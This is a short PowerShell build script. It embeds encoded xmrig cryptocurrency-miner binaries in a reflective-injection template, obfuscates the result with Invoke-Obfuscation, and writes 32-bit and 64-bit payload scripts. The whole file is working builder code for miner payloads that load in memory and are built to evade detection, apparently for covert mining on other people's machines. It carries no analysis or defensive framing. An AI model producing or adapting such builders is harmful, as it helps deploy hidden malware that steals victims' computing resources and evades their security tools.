function Get-RelativePath {
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $RPath
    )
    Join-Path (Split-Path $MyInvocation.ScriptName) $RPath
}

function Out-Build {
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $InputBinary,
        [Parameter(Mandatory=$true)]
        [string]
        $OutputPath
    )
    $InjectionScript = Get-Content (Get-RelativePath -RPath "ReflectiveInjection.ps1") -Raw
    $InjectionScriptWithBinary = $InjectionScript -replace "INSERT_HERE", $InputBinary

    $RawScriptBlock = [Scriptblock]::Create($InjectionScriptWithBinary)

    $ProcessedScript = Invoke-Obfuscation -ScriptBlock $RawScriptBlock -Command "TOKEN\COMMENT\1,COMPRESS\1" -Quiet
    $ProcessedScript | Out-File -FilePath $OutputPath -Encoding utf8
}

Import-Module -Name C:\Users\kissm\Documents\WindowsPowerShell\Modules\Invoke-Obfuscation

$x32binary = Get-Content (Get-RelativePath -RPath "build\build32\libxmrig_encoded")
$x64binary = Get-Content (Get-RelativePath -RPath "build\build64\libxmrig_encoded")
$x32out = Get-RelativePath -RPath .\x32xmrbuild.ps1
$x64out = Get-RelativePath -RPath .\x64xmrbuild.ps1

Out-Build -InputBinary $x32binary -OutputPath $x32out
Out-Build -InputBinary $x64binary -OutputPath $x64out